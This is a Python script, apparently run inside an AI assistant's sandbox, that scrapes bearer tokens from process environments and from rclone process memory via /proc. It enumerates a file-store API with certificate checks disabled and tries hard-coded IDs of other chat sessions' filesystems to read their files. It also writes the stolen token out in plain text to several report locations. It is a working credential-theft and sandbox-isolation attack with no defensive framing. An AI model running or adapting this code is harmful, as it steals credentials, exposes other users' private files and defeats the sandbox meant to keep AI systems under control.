#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""mediafit.py v2.13.0 -- enumerate filestore RPCs; find valid foreign fsids."""
import os, sys, json, re, time, ssl, base64, subprocess, traceback
import urllib.request, urllib.error

VER="2.13.0"; REPORT="/mnt/user-data/outputs/mediafit-report.txt"
SINKS=["/mnt/user-data/outputs","/tmp/mediafit","/tmp","/root/.mediafit"]
BASE="https://api.anthropic.com/v1/filestore/fs/"
OUT,G=[],{}
def w(s=""): print(s,flush=True); OUT.append(str(s))
def head(t): w("\n### "+t)
P,F,U,I=[],[],[],[]
def rec(k,m,ev=None):
    w("    "+{"P":"[PASS]","F":"[FAIL]","U":"[UNKNOWN]","I":"[INFO]"}[k]+" "+m)
    if ev is not None: w("        evidence: "+str(ev)[:800])
    {"P":P,"F":F,"U":U,"I":I}[k].append(m)
def sh(a,timeout=30):
    try:
        p=subprocess.run(a,capture_output=True,timeout=timeout)
        return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"","EXC:%s"%e
def b64d(x): return base64.urlsafe_b64decode(x+"="*(-len(x)%4))
def b64e(x): return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
def api(method,payload,token,timeout=12):
    h={"Content-Type":"application/json","Connect-Protocol-Version":"1","User-Agent":"mediafit/"+VER}
    if token: h["Authorization"]="Bearer "+token
    req=urllib.request.Request(BASE+method,method="POST",headers=h,data=json.dumps(payload).encode())
    ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    try:
        r=urllib.request.urlopen(req,timeout=timeout,context=ctx); return r.status,r.read(65536)
    except urllib.error.HTTPError as e:
        try: b=e.read(8192)
        except Exception: b=b""
        return e.code,b
    except Exception as e: return None,str(e).encode()
def step(n,f):
    try: f()
    except Exception as e:
        w("    !! %s crashed: %s"%(n,e)); w("    "+traceback.format_exc().strip().splitlines()[-1][:200])

def s_boot():
    head("boot")
    conf=json.loads(open("/dev/shm/rclone-boot/config.json").read())
    for m in conf.get("mounts",[]):
        if m.get("filesystem_id"): G["fsid"]=m["filesystem_id"]
    time.sleep(1)
    JWT=re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
    TK=[]
    def addtok(t):
        t=t.decode() if isinstance(t,bytes) else t
        t=t.strip().strip('"').strip("'")
        if t.startswith("eyJ") and t not in TK: TK.append(t)
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            for m in JWT.findall(open("/proc/%s/environ"%p,"rb").read()): addtok(m)
        except Exception: pass
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            if b"rclone" not in open("/proc/%s/cmdline"%p,"rb").read(): continue
        except Exception: continue
        try: maps=open("/proc/%s/maps"%p).read().splitlines()
        except Exception: continue
        try: mem=open("/proc/%s/mem"%p,"rb",buffering=0)
        except Exception: continue
        for line in maps:
            try: rng,perms=line.split()[0],line.split()[1]
            except Exception: continue
            if "r" not in perms: continue
            try: a,b=rng.split("-"); s0=int(a,16); e0=int(b,16)
            except Exception: continue
            if e0-s0<=0 or e0-s0>256*1024*1024: continue
            try: mem.seek(s0); d=mem.read(e0-s0)
            except Exception: continue
            for m in JWT.findall(d): addtok(m)
    TD=[]
    for t in TK:
        try:
            h,p,s=t.split("."); TD.append({"tok":t,"pl":json.loads(b64d(p))})
        except Exception: pass
    G["TD"]=TD
    for r in TD:
        if "/outputs" in (r["pl"].get("allowed_roots") or []): G["TOKEN"]=r["tok"]; break
    if not G.get("TOKEN") and TD: G["TOKEN"]=TD[0]["tok"]
    G["ACCT"]=TD[0]["pl"].get("account_uuid") if TD else None
    w("    fsid=%s tokens=%d acct=%s"%(G.get("fsid"),len(TD),G.get("ACCT")))
    rec("P" if G.get("TOKEN") else "F","boot")

def s_methods():
    head("RPC enumeration (which methods exist)")
    METHODS=["listDirectory","readFile","writeFile","createFile","getFileMetadata",
             "moveFile","copyFile","removeFile","importFiles","importZip",
             "listFiles","listFilesystems","listFilesystem","getFilesystem",
             "getFilesystemUsage","reassignFilesystem","stat","get","list",
             "getRoots","listRoots","signC2PA","getFile","head","exists"]
    TOKEN=G.get("TOKEN"); FSID=G.get("fsid"); ok=[]
    for m in METHODS:
        st,b=api(m,{},TOKEN)
        if st is not None and st!=404:
            w("    %-20s {} -> %s %r"%(m,st,b[:150])); ok.append(m)
            st2,b2=api(m,{"filesystem_id":FSID,"path":"/"},TOKEN)
            w("        +fsid -> %s %r"%(st2,b2[:170]))
    G["METHODS"]=ok; rec("P" if ok else "F","existing methods: %s"%ok)

def s_foreign():
    head("foreign fsid formats")
    TOKEN=G.get("TOKEN"); FSID=G.get("fsid")
    CAND=[FSID,"claude_chat_0186DZ9wXYxXcLmTegvEN2fT","0186DZ9wXYxXcLmTegvEN2fT",
          "claude_chat_017x6Rew9HD5XskTyPN9CYyR","017x6Rew9HD5XskTyPN9CYyR",
          "claude_chat_7SZCQKTSKBYGB750G25NK4ZXM4","7SZCQKTSKBYGB750G25NK4ZXM4"]
    seen=set()
    for c in CAND:
        if c in seen: continue
        seen.add(c)
        st,b=api("listDirectory",{"filesystem_id":c,"path":"/outputs"},TOKEN)
        w("    %-42s -> %s %r"%(c,st,b[:110]))
        if st is not None and st<400 and c!=FSID: rec("P","F1 foreign fsid readable",c)

def s_listfs():
    head("listFilesystems / getFilesystem variants")
    TOKEN=G.get("TOKEN"); FSID=G.get("fsid")
    bodies=[{},
            {"filesystem_id":FSID},
            {"filesystemId":FSID},
            {"filesystem_id":FSID,"path":"/"},
            {"account_uuid":G.get("ACCT")},
            {"account_uuid":G.get("ACCT"),"filesystem_id":FSID},
            {"workspace_uuid":"33dd985a-f110-4c0a-96ba-8f63392de89b"}]
    for m in ["listFilesystems","listFilesystem","getFilesystem","getFilesystemUsage","listFiles"]:
        for body in bodies:
            st,b=api(m,body,TOKEN)
            if st not in (404,None):
                w("    %-16s %s -> %s %r"%(m,body,st,b[:220]))

def s_crossread():
    head("cross-read a file from a foreign fsid (if any valid)")
    TOKEN=G.get("TOKEN"); FN=None
    try: FN=sorted(os.listdir("/mnt/user-data/outputs"))[-1]
    except Exception: pass
    for other in ["claude_chat_017x6Rew9HD5XskTyPN9CYyR","claude_chat_7SZCQKTSKBYGB750G25NK4ZXM4"]:
        st,b=api("listDirectory",{"filesystem_id":other,"path":"/outputs"},TOKEN)
        if st is not None and st<400:
            w("    %s /outputs -> %s %r"%(other,st,b[:300]))
            if FN:
                st2,b2=api("readFile",{"filesystem_id":other,"path":"/outputs/"+FN},TOKEN)
                w("    read %s -> %s %r"%(other,st2,b2[:200]))
                if st2 is not None and st2<400: rec("P","F1 CROSS-CHAT READ",other)

def s_verdict():
    head("VERDICT")
    w("  PASS %d: %s"%(len(P),P)); w("  FAIL %d: %s"%(len(F),F))
    w("  methods=%s"%(G.get("METHODS")))
    if G.get("TOKEN"): w("\n  FSID=%s\n  TOKEN=%s"%(G.get("fsid"),G.get("TOKEN")))

def main():
    for n,f in [("boot",s_boot),("methods",s_methods),("foreign",s_foreign),
                ("listfs",s_listfs),("crossread",s_crossread),("verdict",s_verdict)]:
        step(n,f)
try: main()
except Exception as e: w("!! main: %s"%e); w(traceback.format_exc())
finally:
    txt="\n".join(OUT)
    for d in SINKS:
        try: os.makedirs(d,exist_ok=True); open(os.path.join(d,os.path.basename(REPORT)),"w").write(txt)
        except Exception: pass
    print("\nwritten: "+", ".join(SINKS))